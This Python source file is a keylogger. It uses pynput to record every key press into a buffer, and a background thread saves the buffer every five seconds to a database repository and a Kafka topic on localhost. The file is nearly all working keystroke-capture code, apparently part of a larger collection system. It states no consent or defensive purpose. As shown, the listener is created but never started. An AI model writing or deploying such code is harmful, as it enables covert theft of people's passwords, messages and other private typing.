from pynput import keyboard
import threading
import logging
import time
from db.repository.KeyloggerRepository import KeyloggerRepository
from kafkadir.KafkaProducerWrapper import KafkaProducerWrapper
import kafka.errors

keystrokes = ""
start_time = time.time()

def on_press(key):
    global keystrokes
    try:
        if key == keyboard.Key.enter:
            keystrokes += "\n"
        elif key == keyboard.Key.tab:
            keystrokes += "\t"
        elif key == keyboard.Key.space:
            keystrokes += " "
        elif key == keyboard.Key.backspace:
            keystrokes += "[Backspace]"
        elif key == keyboard.Key.shift:
            keystrokes += "[SHIFT]"
        elif key == keyboard.Key.ctrl:
            keystrokes += "[CTRL]"
        elif key == keyboard.Key.alt:
            keystrokes += "[ALT]"
        else:
            keystrokes += str(key).strip("'")
    except Exception:
        logging.error("Error in on_press")

keyboardListener = keyboard.Listener(
    on_press=on_press)


kafka_producer = KafkaProducerWrapper(['localhost:9092'])
keyloggerRepository = KeyloggerRepository()

def save_keystrokes():
    global keystrokes
    global start_time
    print(keystrokes)
    if keystrokes:
        data = {
            "start_time": start_time,
            "keys": keystrokes,
            "end_time": time.time()
        }
        keyloggerRepository.insert_keylog(start_time=data["start_time"], keys=data["keys"], end_time=data["end_time"])
        kafka_producer.send_message(KafkaProducerWrapper.KEYLOGGER_TOPIC, data)
        
    keystrokes = ""
    start_time = time.time()

def schedule_insertion():
    while True:
        save_keystrokes()
        time.sleep(5)

thread = threading.Thread(target=schedule_insertion)
thread.start()